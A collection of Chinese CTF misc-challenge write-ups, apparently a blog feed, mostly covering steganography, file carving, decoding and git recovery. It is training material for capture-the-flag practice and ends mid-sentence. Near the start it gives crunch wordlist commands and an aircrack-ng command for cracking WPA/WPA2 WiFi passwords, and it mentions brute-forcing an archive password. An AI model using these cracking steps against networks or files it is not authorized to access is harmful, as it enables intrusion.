src="https://img-blog.csdnimg.cn/20201030225113875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>#字典生成工具crunch：<br>参数:  crunch<br>-t   @/,/%/^<br><br>     @插入小写字母<br>    ，插入大写字母<br>    %插入数字<br>^插入特殊符号<br>例子：<br>（1）生成11个数字组合的密码字典：</p><pre><code>crunch 11 11 0123456789 -o mypwd.txt     //第一个11代表生成的字符串最短几个字符，第二个11代表生成的字符串最长几个字符</code></pre><p>（2）生成4个数字和1391040组合的密码字典：</p><pre><code>crunch 11 11 0123456789 -t 1391040%%%% -o mypwd.txt</code></pre><p>（3）生成4个小写字母和4个数字组合的密码字典：</p><pre><code>crunch 8 8 -t @@@@%%%%  -o mypwd.txt</code></pre><p>#工具aircrack破解WiFi密码：破解WEP/WPA/WPA2加密的主流工具之一</p><pre><code>aircrack-ng -w mypwd.txt wifi.cap       //前面是密码字典的位置，后面是需要破解的握手包即.cap文件的位置，看到KEY FOUND即为找到密码</code></pre><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>（1）用notepad++打开附件，搜索flag，无果。再试试搜key，发现flag。<br><img src="https://img-blog.csdnimg.cn/20201030225632898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030225640161.png#pic_center" alt="在这里插入图片描述"></p><h2 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h2><p>（1）得到一张.jpg的图片，用notepad++打开，发现有两张.jpg的图片，还有一些其他的文件。放到kali中用foremost分解，foremost -t all 1.jpg<br><img src="https://img-blog.csdnimg.cn/20201030225710475.png#pic_center" alt="在这里插入图片描述"><br>（2）分解完后，在output目录下发现有一个压缩包，压缩包里面还有一张2.png图片，但解压需要密码<br><img src="https://img-blog.csdnimg.cn/20201030225727162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）查看原有图片的属性，在“详细信息”里看到备注中的一串字符<br><img src="https://img-blog.csdnimg.cn/2020103022574693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）应该被加密了，用base64解码后得到MSDS456ASD123zz<br><img src="https://img-blog.csdnimg.cn/20201030225802968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）以解码后的字符作为密码，解压压缩包，得到2.png（可将压缩包放到Windows下解压）<br><img src="https://img-blog.csdnimg.cn/2020103022581822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）用notepad++打开2.png，搜索flag或key，无果。修改图片的高度，使其和长度一样<br><img src="https://img-blog.csdnimg.cn/20201030225835951.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030225842650.png#pic_center" alt="在这里插入图片描述"><br>（7）看到了flag<br><img src="https://img-blog.csdnimg.cn/20201030225856761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h2><p>（1）得到一张.jpg图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030225938915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现其中还包含其他文件，放到kali中用foremost分解。得到一个zip文件夹，里面有多个文件<br><img src="https://img-blog.csdnimg.cn/20201030225959464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）用notepad++依次打开8，88，888，8888，88888，888888，8888888，88888888<br>发现88，888，8888都是jpg文件，其他的则是bmp文件（文件头42 4D 76）。修改各个文件的后缀名<br><img src="https://img-blog.csdnimg.cn/20201030230022380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）发现88.jpg有一个二维码，用扫描器得到bilibili<br><img src="https://img-blog.csdnimg.cn/20201030230047182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）依次查看各图片的属性，在888.jpg中发现base64密文，解密后得到silisili<br><img src="https://img-blog.csdnimg.cn/20201030230105655.png#pic_center" alt="在这里插入图片描述"><br>（6）根据提示，按顺序分析8888.jpg，在notepad++里发现还有一个压缩包<br><img src="https://img-blog.csdnimg.cn/20201030230123626.png#pic_center" alt="在这里插入图片描述"><br>（7）将8888.jpg放到kali中用foremost分解，得到一张二维码图片，扫描后的到panama<br><img src="https://img-blog.csdnimg.cn/20201030230146958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>8）按顺序排列，flag为flag{bilibili_silisili_panama}，注意格式，中间记得要有下划线</p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_002</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-002/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-002/</url>
      
        <content type="html"><![CDATA[<h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>（1）附件是一个后缀名为bin的文件，用路由器密码备份文件RouterPassView打开<br><img src="https://img-blog.csdnimg.cn/20201030223405664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据提示flag为宽带用户名，在RouterPassView中用Ctrl+F搜索username，即为flag<br><img src="https://img-blog.csdnimg.cn/20201030223420108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>（1）附件是一张.jpg图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030223453487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223505673.png#pic_center" alt="在这里插入图片描述"><br>（2）确认以FF D8开头后，查找结尾FF D9，发现了一个压缩包<br><img src="https://img-blog.csdnimg.cn/2020103022354151.png#pic_center" alt="在这里插入图片描述"><br>（3）该图片后缀名为zip，解压，得到提示.jpg和flag.rar，查看提示，flag.rar的解压密码为3位数<br><img src="https://img-blog.csdnimg.cn/2020103022360534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>4）用暴力破解工具破解密码，得到密码为871，成功解压flag.rar，得到一张图片<br><img src="https://img-blog.csdnimg.cn/20201030223633765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223640406.png#pic_center" alt="在这里插入图片描述"><br>（5）用notepad++打开图片，发现被加密的flag，用base64解码得到真正的flag内容<br><img src="https://img-blog.csdnimg.cn/20201030223716672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h2><p>（1）附件解压后是一个exe文件，无法打开，放到notepad++里分析，发现一串base64编码的字符串<br><img src="https://img-blog.csdnimg.cn/20201030223745276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据题目提示，解题过程中会得到一个二维码图片，用在线工具把base64还原为图片<br><img src="https://img-blog.csdnimg.cn/20201030223801887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020103022380953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）用二维码扫描器打开，得到flag</p><h2 id="闪的好快"><a href="#闪的好快" class="headerlink" title="闪的好快"></a>闪的好快</h2><p>（1）附件是一张gif的二维码动图，用stegsolve工具打开，对其进行分解。一共18张二维码图片<br><img src="https://img-blog.csdnimg.cn/20201030223853420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）一张张保存后，用二维码扫描工具一张张扫过去，并记录在记事本里，最终得到flag<br><img src="https://img-blog.csdnimg.cn/20201030223911472.png#pic_center" alt="在这里插入图片描述"></p><h2 id="come-game"><a href="#come-game" class="headerlink" title="come_game"></a>come_game</h2><p>（1）解压后得到一个exe文件，是个游戏，进去玩一玩<br><img src="https://img-blog.csdnimg.cn/2020103022394692.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223957648.png#pic_center" alt="在这里插入图片描述"><br>（2）发现生成了3个文件，分别用notepad++打开，发现save文件是表示关卡的意思<br><img src="https://img-blog.csdnimg.cn/20201030224015199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）将2改为3，对应的十六进制改为33，然后重新打开游戏就会跳到下一个关卡。以此类推，在第5关发现了flag，注意最后的提交格式为SYC{}<br><img src="https://img-blog.csdnimg.cn/20201030224034984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="白哥的鸽子"><a href="#白哥的鸽子" class="headerlink" title="白哥的鸽子"></a>白哥的鸽子</h2><p>（1）得到一张jpg格式的图片，用notepad++打开，在图片结尾FF D9后面发现一串特殊的字符<br><img src="https://img-blog.csdnimg.cn/20201030224108166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224128873.png#pic_center" alt="在这里插入图片描述"><br>（2）将其十六进制数转为字符串fg2ivyo}l{2s3_o@aw__rcl@<br><img src="https://img-blog.csdnimg.cn/20201030224200744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）得到的字符使用了栅栏密码，用CTFcrackTools解码，找到flag，最后的两个@@是干扰，去掉。<br><img src="https://img-blog.csdnimg.cn/20201030224222135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>得到一个1.tar.gz的文件<br>解法一（快速）：直接用7-zip打开，直到发现flag.txt文本<br><img src="https://img-blog.csdnimg.cn/20201030224315674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二:<br>（1）放到linux底下解压，tar -xvf 1.tar.gz<br><img src="https://img-blog.csdnimg.cn/20201030224351426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）查看flag里可打印的字符：strings flag    或者也可以直接查看flag里的内容cat flag<br><img src="https://img-blog.csdnimg.cn/20201030224424537.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224431429.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224453287.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224500494.png#pic_center" alt="在这里插入图片描述"></p><h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>（1）附件是一张图片，放到notepad++里，没有发现什么有用信息<br><img src="https://img-blog.csdnimg.cn/20201030224538196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）再仔细查看图片，图片下面应该还有一部分，则notepad++里修改图片的高度，改为和长度一样试试<br><img src="https://img-blog.csdnimg.cn/20201030224553705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224601164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）看到了flag<br><img src="https://img-blog.csdnimg.cn/20201030224632724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_001</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-001/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-001/</url>
      
        <content type="html"><![CDATA[<h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>（1）解压附件，发现有一张图片，并没有有用的信息<br><img src="https://img-blog.csdnimg.cn/20201030222021275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据题意，flag被隐藏起来了，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030222050891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）红色方框部分代表的是图片的像素，也可以理解为长和高，发现图片的高度比长度小了不少，将高度修改为长度的值。<br><img src="https://img-blog.csdnimg.cn/20201030222126820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）保存后重新打开图片，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030222143936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h2><p>（1）下载附件，得到一个名为zip没有后缀名的文件<br>（2）用notepad++打开，发现文件头是50 4B 03 04，说明是一个压缩文件<br><img src="https://img-blog.csdnimg.cn/20201030222246657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）修改文件后缀名为.zip，解压后得到一个文档<br><img src="https://img-blog.csdnimg.cn/20201030222313691.png#pic_center" alt="在这里插入图片描述"><br>（4）双击打开后并没有发现有用信息，再用notepad++打开，发现又是一个压缩文件<br><img src="https://img-blog.csdnimg.cn/20201030222346825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）修改后缀名为.zip，解压后得到一个文件夹<br><img src="https://img-blog.csdnimg.cn/20201030222418463.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030222429644.png#pic_center" alt="在这里插入图片描述"><br>（6）最终在word文件夹里找到flag，可用记事本或notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030222459970.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030222507509.png#pic_center" alt="在这里插入图片描述"></p><h2 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h2><p>（1）打开附件，解压后得到一张.jpg图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030222548608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）文件头确实是以FF D8 开头，寻找结尾FF D9<br><img src="https://img-blog.csdnimg.cn/20201030222607981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）发现FF D9后面还有一个压缩文件，50 4B 03 04，将原来的图片改后缀名为.zip，也可以在kali下用命令foremost -t all ada.jap 分离文件。<br><img src="https://img-blog.csdnimg.cn/20201030222638392.png#pic_center" alt="在这里插入图片描述"><br>（4）解压，但发现需要密码<br><img src="https://img-blog.csdnimg.cn/20201030222716140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）查看图片属性，发现一串字符，作为密码输入，但显示密码错误<br><img src="https://img-blog.csdnimg.cn/20201030222737816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）将这串十六进制字符转为ASCII码字符，得到sdnisc_2018，将其作为解压密码，得到flag<br><img src="https://img-blog.csdnimg.cn/20201030222759359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030222809753.png#pic_center" alt="在这里插入图片描述"></p><h2 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h2><p>（1）附件是一张.jpg的图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030222856237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）确实以FF D8开头，寻找图片结尾FF D9，接连找到几个FF D9后，又发现了一张以FF D8开头的.jpg图片<br><img src="https://img-blog.csdnimg.cn/20201030222917608.png#pic_center" alt="在这里插入图片描述"><br>（3）用kali输入命令foremost -t -all 2.jpg分离文件，则又得到了一张图片，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030222940899.png#" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202010302230013.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223007998.png#pic_center" alt="在这里插入图片描述"></p><h2 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h2><p>（1）附件是一张图片，根据提示是某人的名字，直接百度搜索图片，是刘亦菲，名字拼音即flag<br><img src="https://img-blog.csdnimg.cn/20201030223039681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223048756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc_004</title>
      <link href="2020/11/15/XCTF/XCTF_Misc-004/"/>
      <url>2020/11/15/XCTF/XCTF_Misc-004/</url>
      
        <content type="html"><![CDATA[<h2 id="embarrass"><a href="#embarrass" class="headerlink" title="embarrass"></a>embarrass</h2><p>（1）下载附件，是一个流量包，用wireshark打开，输入tcp contains flag，并追踪tcp流，找了很久，没有找到。<br><img src="https://i.loli.net/2020/11/15/l9KHhroMWP7OiYN.png" alt="在这里插入图片描述"><br>（2）放到kali中，用foremost分离文件，得到大量的htm文件和一张jpg图片，但没有找到flag<br><img src="https://i.loli.net/2020/11/15/KQ4ziVuqCkgvbwj.png" alt="在这里插入图片描述"><br><img src="https://i.loli.net/2020/11/15/cY5Id2ngUBJ3XFZ.png" alt="在这里插入图片描述"><br>（3）在kaili中用strings命令找到flag</p><pre><code>strings misc_02.pcapng | grep flag</code></pre><p><img src="https://i.loli.net/2020/11/15/cY5Id2ngUBJ3XFZ.png" alt="在这里插入图片描述"></p><h2 id="MISCall"><a href="#MISCall" class="headerlink" title="MISCall"></a>MISCall</h2><p>（1）下载附件，得到一个没有后缀名的文件，放到kali中binwalk一下，发现是一个bzip2类型的压缩包，为了方便，重命名一下，改为1.bzip2</p><p><img src="https://i.loli.net/2020/11/15/pMuYPblFTah97om.png" alt="image-20201115185454990"></p><p>（2）解压</p><pre><code>tar xvf 1.bzip2</code></pre><p><img src="https://i.loli.net/2020/11/15/S3n7zFvPRj6dhit.png" alt="image-20201115190744053"></p><p>（3）发现了一个flag.txt和.git文件夹，但flag.txt中没有flag。利用.git目录，git stash进行恢复以前修改/删除的文件。查看git 记录，给出了一个最近上传的文件，但这个文件并不存在</p><pre><code>git log  //查看git记录</code></pre><p><img src="https://i.loli.net/2020/11/15/5IsbF7Vqx1W8aQy.png" alt="image-20201115220941620"></p><p>（4）查看修改列表，存储列表中有一条记录</p><pre><code>git stash list   //查看修改列表</code></pre><p><img src="https://i.loli.net/2020/11/15/Zj3pUFvGExP9o6R.png" alt="image-20201115221415569"></p><p>（5）校验列表中的存储文件</p><p><img src="https://i.loli.net/2020/11/15/GE9BMlFo1pnQqv2.png" alt="image-20201115221608681"></p><p>（6）恢复上面的文件，直接执行 git stash apply 时，会提示文件覆盖自动终止，可以先把原来的flag.txt删除再执行</p><pre><code>git stash apply   //恢复文件</code></pre><p><img src="https://i.loli.net/2020/11/15/QDfqhwAg72E1UIM.png" alt="image-20201115222553488"></p><p>（7）运行s.py得到flag</p><pre><code>python s.py</code></pre><h2 id="Get-the-key-txt"><a href="#Get-the-key-txt" class="headerlink" title="Get-the-key.txt"></a>Get-the-key.txt</h2><p>（1）下载附件，得到一个压缩包，解压后是一个没有后缀名的文件，放到kali中binwalk一下查看文件类型，也可使用file命令</p><pre><code>file fileName</code></pre><p><img src="https://i.loli.net/2020/11/16/zsJpYd4Vtui18rM.png" alt="image-20201116162315709"></p><p>（2）发现是Linux的文件系统数据，在/tmp下创建forensic文件夹，并将文件挂载到该目录下</p><pre><code>mkdir /tmp/forensicmount -o loop forensic100 /tmp/forensic    //挂载</code></pre><p>（3）进入新创建的目录下，发现大量文件</p><p><img src="https://i.loli.net/2020/11/16/7S92HjkdNI3FWyJ.png" alt="image-20201116162837956"></p><p>（4）根据题目提示 get-the-key.txt，使用如下命令进行文件匹配</p><pre><code>grep -r key.txt</code></pre><p><img src="https://i.loli.net/2020/11/16/Y54CSjGl1qNLPFz.png" alt="image-20201116163043401"></p><p>（5)得到一个二进制的名为1的文件，查看其类型</p><p><img src="https://i.loli.net/2020/11/16/FAKorPwyYfG5xWs.png" alt="image-20201116163215732"></p><p>（6）是gzip压缩包，但用gunzip 1解压会出错，tar xvf 1也不行，最后使用gunzip &lt; 